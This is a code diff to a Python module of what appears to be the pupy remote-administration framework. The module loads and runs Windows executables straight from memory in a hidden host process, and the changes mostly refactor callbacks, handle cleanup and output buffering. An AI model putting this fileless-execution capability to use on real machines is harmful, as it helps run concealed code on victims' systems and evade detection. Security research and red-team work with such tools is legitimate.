@@ -30,18 +30,18 @@
 # POSSIBILITY OF SUCH DAMAGE
 # --------------------------------------------------------------
 
-import sys
-import pupymemexec
-import time
-import os
 import ctypes
-import traceback
-import time
 import threading
-import rpyc
 
 from ctypes.wintypes import DWORD, HANDLE, BOOL, LPVOID, UINT
 from ctypes import byref, create_string_buffer, POINTER, WinError
+
+from pupy import is_supported, mexec
+from network.lib.pupyrpc import nowait
+
+if not is_supported(mexec):
+    import pupymemexec
+    mexec = pupymemexec.run_pe_from_memory
 
 ERROR_BROKEN_PIPE = 0x6D
 
@@ -64,21 +64,23 @@ WriteFile.argtypes = [
 
 CloseHandle = ctypes.windll.kernel32.CloseHandle
 CloseHandle.restype = BOOL
-CloseHandle.argtypes = [ HANDLE ]
+CloseHandle.argtypes = [HANDLE]
 
 TerminateProcess = ctypes.windll.kernel32.TerminateProcess
 TerminateProcess.restype = BOOL
-TerminateProcess.argtypes = [ HANDLE, UINT ]
+TerminateProcess.argtypes = [HANDLE, UINT]
 
 GetProcessId = ctypes.windll.kernel32.GetProcessId
 GetProcessId.restype = DWORD
-GetProcessId.argtypes = [ HANDLE ]
+GetProcessId.argtypes = [HANDLE]
 
 PIPE_READMODE_BYTE = 0x0
 PIPE_NOWAIT = 0x1
 
+
 class MemoryPE(object):
     ''' run a pe from memory. '''
+
     def __init__(self, raw_pe, args=[], suspended_process=None, hidden=True, dupHandle=None):
         self.cmdline = suspended_process or 'cmd.exe'
 
@@ -102,10 +104,15 @@ class MemoryPE(object):
             self.dupHandle = 0
 
         self.EOF = threading.Event()
+        self.stdout = ''
 
     def close(self):
         # Killing the program if he is still alive
         self.EOF.set()
+
+        if self.pStdout:
+            CloseHandle(self.pStdout)
+            self.pStdout = None
 
         if self.pStdin:
             CloseHandle(self.pStdin)
@@ -113,7 +120,7 @@ class MemoryPE(object):
 
         if self.hProcess:
             if self.terminate:
-                TerminateProcess(self.hProcess, 1);
+                TerminateProcess(self.hProcess, 1)
 
             CloseHandle(self.hProcess)
             self.hProcess = None
@@ -125,22 +132,23 @@ class MemoryPE(object):
         if self.write_cb:
             self.write_cb = None
 
-    def execute(self, complete_cb, write_cb):
+    def execute(self, complete_cb, write_cb=True):
         ''' Execute process '''
 
         if complete_cb:
-            self.complete_cb = rpyc.async(complete_cb)
+            self.complete_cb = nowait(complete_cb)
 
-        if write_cb:
-            self.write_cb = rpyc.async(write_cb)
+        if write_cb and write_cb is not True:
+            self.write_cb = nowait(write_cb)
             self.terminate = True
 
         try:
-            hProcess, pStdin, pStdout = pupymemexec.run_pe_from_memory(
+            hProcess, pStdin, pStdout = mexec(
                 self.cmdline, self.raw_pe, write_cb is not None,
                 self.hidden, self.dupHandle
             )
         except Exception, e:
+            self.write_cb('[!] memexec failed: {}\n'.format(e))
             return False
 
         self.pStdout = HANDLE(pStdout)
@@ -163,9 +171,6 @@ class MemoryPE(object):
 
     def _loop(self):
         try:
-            starttime = time.time()
-            VECTOR = (HANDLE * 2)
-
             while True:
                 buffer = create_string_buffer(2048)
                 c_read = DWORD(0)
@@ -187,9 +192,8 @@ class MemoryPE(object):
                         except:
                             # We need to empty pipe anyway
                             pass
-
-            CloseHandle(self.pStdout)
-            self.pStdout = None
+                    else:
+                        self.stdout += buffer.value
 
         except Exception, e:
             if self.write_cb:
